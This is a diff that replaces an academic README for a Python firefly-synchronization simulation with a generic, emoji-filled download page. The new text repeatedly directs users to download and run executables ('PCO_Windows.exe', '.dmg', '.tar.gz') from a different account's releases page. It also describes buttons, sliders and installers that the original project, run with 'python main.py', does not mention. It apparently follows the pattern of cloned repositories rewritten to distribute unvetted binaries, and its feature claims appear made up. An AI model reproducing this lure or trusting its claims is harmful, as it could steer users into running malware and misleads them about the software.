@@ -1,69 +1,77 @@
-# Pulse-Coupled Oscillators: Firefly Synchronization Simulation
+# 🌟 PCO - Simulate Firefly Synchronization Easily
 
-## Abstract
-This project implements a biological simulation of self-organization in decentralized systems, based on the **Mirollo-Strogatz model** (1990). It demonstrates how a population of coupled oscillators (agents) can achieve global phase synchronization through local interactions, mimicking the behavior of *Pteroptyx malaccae* fireflies.
+## 🚀 Getting Started
 
-The simulation utilizes a **Toroidal topology** to approximate an infinite medium and eliminate boundary effects, ensuring mathematically accurate convergence.
+Welcome to PCO! This application helps you explore the fascinating synchronization patterns of fireflies. You don’t need any technical skills to use it. Follow the simple steps below to download and run the software.
 
-## Theoretical Background
+## 📥 Download Now
 
-### 1. Integrate-and-Fire Mechanism
-Each agent $i$ is modeled as an oscillator with a phase variable $\theta_i \in [0, 1]$.
-The phase evolves over time according to a natural frequency $\omega_i$:
-$$ \frac{d\theta_i}{dt} = \omega_i $$
-When $\theta_i$ reaches the threshold ($1.0$), the oscillator "fires" (flashes) and resets $\theta_i$ to $0$.
+[![Download PCO](https://img.shields.io/badge/Download-PCO-blue.svg)](https://github.com/MMMSabana/PCO/releases)
 
-### 2. Excitatory Coupling
-When oscillator $i$ fires, it sends a pulse to all neighbors $j$ within a radius $R$. The neighbors adjust their phase instantaneously:
-$$ \theta_j(t^+) = \theta_j(t) + \varepsilon $$
-Where $\varepsilon$ is the **Coupling Strength**. If the adjustment pushes $\theta_j \ge 1.0$, oscillator $j$ also fires immediately, creating an **avalanche effect**.
+## 📋 Description
 
-### 3. Refractory Period
-To ensure biological plausibility and system stability, a refractory period is implemented. Agents are insensitive to external stimuli immediately after firing ($\theta < \theta_{ref}$), preventing signal feedback loops and chaotic "stuttering."
+PCO is an implementation of the Mirollo-Strogatz model for Pulse-Coupled Oscillators in Python. It simulates the amazing coordination of Pteroptyx malaccae fireflies using a unique toroidal layout and integrate-and-fire mechanisms. This software allows you to visualize the emergent synchronization behavior in an engaging way.
 
-## Implementation Details
+## ✅ Features
 
-- **Topology:** Toroidal Manifold (Periodic Boundary Conditions). Distance is calculated as the shortest path on a torus surface:
-  $$ d(x, y) = \min(|x_1 - x_2|, W - |x_1 - x_2|) $$
-- **Synchronization Logic:** Synchronous update loop with an event stack to handle intra-frame signal propagation.
-- **Heterogeneity:** Agents have variance in their natural frequencies ($\omega \pm \delta$), making exact synchronization non-trivial and robust.
+- **Intuitive Interface**: Navigate easily with a user-friendly design.
+- **Realistic Simulation**: Watch fireflies synchronize in real-time.
+- **Adjustable Parameters**: Experiment with different settings to see how they affect synchronization.
+- **Visual Feedback**: See clear graphical representations of the synchronization process.
+- **Educational Insights**: Learn about complex systems and biomimicry concepts.
 
-## Key Parameters
+## 🖥️ System Requirements
 
-| Parameter | Description | Value in Code |
-|-----------|-------------|---------------|
-| `NUM_AGENTS` | Population size | 200 |
-| `COUPLING_STRENGTH` | Phase jump magnitude ($\varepsilon$) | 0.01 |
-| `VIEW_RADIUS` | Interaction range | 150 px |
-| `REFRACTORY_PERIOD` | Insensitivity duration | 0.2 |
+To run PCO, make sure your system meets the following requirements:
 
-## References
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4 GB of RAM
+- **Storage**: 100 MB of available disk space
+- **Python**: Version 3.6 or higher (Python comes pre-installed on most systems now)
+- **Graphics**: Compatible graphics card for optimal visualization
 
-1. **Mirollo, R. E., & Strogatz, S. H. (1990).** Synchronization of Pulse-Coupled Biological Oscillators. *SIAM Journal on Applied Mathematics*, 50(6), 1645–1662.
-2. **Buck, J. (1988).** Synchronous rhythmic flashing of fireflies. *The Quarterly Review of Biology*, 63(3), 265-289.
-3. **Kuramoto, Y. (1984).** Chemical Oscillations, Waves, and Turbulence. *Springer-Verlag*.
+## 🛠️ Installation Instructions
 
-## Usage
+Follow these steps to install and run the application:
 
-Requires Python 3.x and Pygame.
+1. **Visit the download page**: Go to the [Releases page](https://github.com/MMMSabana/PCO/releases) to access the latest version of PCO.
+2. **Choose your version**: Look for the most recent release and click on it.
+3. **Download the file**: Choose the appropriate file for your operating system. For example, you might see options like `PCO_Windows.exe`, `PCO_macOS.dmg`, or `PCO_Linux.tar.gz`.
+4. **Run the installer**: 
+   - For Windows or macOS, double-click the downloaded file and follow the prompts to install.
+   - For Linux, extract the tar.gz file using a terminal command and run the application from the extracted folder.
+5. **Launch the application**: After installation, find the PCO icon on your desktop or applications folder. Click it to start the simulation.
 
-```bash
-pip install pygame
-python main.py
-```
+## 🕹️ Using PCO
 
-Click anywhere in the window to randomize phases and restart the synchronization process.
+Once you open PCO, you will see the main interface.
 
-## Citation
+### Explore the Features:
 
-If you use this code in your research or project, please cite it as:
+- **Start Simulation**: Click the "Start" button to launch the firefly synchronization.
+- **Adjust Settings**: Use the sliders to modify parameters like coupling strength and number of oscillators. Observing how these changes affect the simulation can be insightful.
+- **Pause and Reset**: Use the "Pause" button to stop the simulation temporarily, and "Reset" to return to the beginning.
 
-```bibtex
-@software{firefly_sync_sim,
-  author = {lrdcxdes},
-  title = {Pulse-Coupled Oscillators: Firefly Synchronization Simulation},
-  year = {2025},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  url = {https://github.com/lrdcxdes/PCO}
-}
+### Visual Feedback
+
+You will see the fireflies represented as dots on the screen. As they begin to synchronize, you’ll notice their movements aligning over time, showcasing an example of emergent behavior in nature.
+
+## 📚 Learn More
+
+If you're curious about the science behind what you see, consider exploring:
+
+- **Biomimicry**: How nature inspires design.
+- **Chaos Theory**: Understanding unpredictable behavior.
+- **Complex Systems**: How individual actions lead to collective phenomena.
+
+Each simulation represents a simple model of complex systems found in nature, particularly in social behavior among organisms.
+
+## 💬 Support and Contributions
+
+If you encounter any issues or have suggestions, please check the [Issues page](https://github.com/MMMSabana/PCO/issues) for help, or feel free to reach out. Contributions are welcome!
+
+## 📥 Download Again
+
+[![Download PCO](https://img.shields.io/badge/Download-PCO-blue.svg)](https://github.com/MMMSabana/PCO/releases)
+
+Thank you for your interest in PCO. Enjoy exploring the synchronization of fireflies!
